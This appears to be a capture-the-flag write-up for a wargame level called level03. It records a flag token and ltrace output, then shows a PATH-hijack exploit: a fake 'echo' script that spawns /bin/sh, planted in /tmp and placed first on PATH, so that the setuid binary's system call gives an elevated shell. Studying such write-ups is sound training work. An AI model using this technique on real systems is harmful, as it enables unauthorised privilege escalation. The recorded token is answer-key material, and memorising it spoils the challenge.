#!/bin/bash

#flag 
#token qi0maab88jeaj46qoumi7maus

file level03 

ltrace traces calls to dynamically linked library functions
libc functions (system, printf, setuid, etc.)

__libc_start_main(0x80484a4, 1, 0xbffff7f4, 0x8048510, 0x8048580 <unfinished ...>
getegid()
geteuid()
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)
system("/usr/bin/env echo Exploit me"Exploit me


cat > /tmp/echo << 'EOF'
> #!/bin/sh
> /bin/sh
> EOF

chmod +x /tmp/echo
export PATH=/tmp:$PATH

./level03 

